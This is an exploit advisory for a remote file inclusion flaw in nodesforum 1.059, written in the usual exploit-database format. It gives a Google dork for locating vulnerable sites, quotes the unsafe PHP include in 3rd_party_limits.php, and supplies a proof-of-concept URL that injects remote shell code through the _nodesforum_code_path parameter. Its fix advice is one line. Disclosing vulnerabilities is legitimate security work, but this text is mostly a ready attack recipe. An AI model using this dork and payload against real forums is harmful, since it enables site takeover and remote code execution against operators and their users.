@@ -1,0 +1,35 @@
+# Exploit Title: nodesforum 1.059 Remote File Inclusion Vulnerability
+# Google Dork: inurl: powered by Nodesforum
+# Date: 6/23/2011
+# Author: bd0rk ( bd0rk[at]hackermail.com )
+# Software-Download: http://home.nodesforum.com/download?file=nodesforum_1.059_with_bbcode_1.004.zip
+# Tested on: Ubuntu-Linux / WinVista
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerable Code in 3rd_party_limits.php line 6 - 8
+
+--------------------------------------------------------------------------------------------------------------
+
+$limits_cache_url=$_nodesforum_code_path.'cache/'.$_nodesforum_db_table_name_modifier.'_3rd_party_limits.php';
+if(@filemtime($limits_cache_url) && @filemtime($limits_cache_url)>(time()-(24*3600*14)))
+{include($limits_cache_url);}
+
+--------------------------------------------------------------------------------------------------------------
+
+The parameter $limits_cache_url is declared with the other parameter $_nodesforum_code_path
+So we can use the declared.
+
+
+
+
+PoC: http://[target_host]/nodesforum/3rd_party_limits.php?_nodesforum_code_path=[RemoteShellCode]
+
+
+Fixtip: Declare $_nodesforum_code_path, likewise!
+
+
+Greetings: Kathrin J., Perle, x0r_32 and ZUBAIR ANJUM ;-)
+
+
+
+#### The 22 years old, german Hacker bd0rk #### <---white-hat
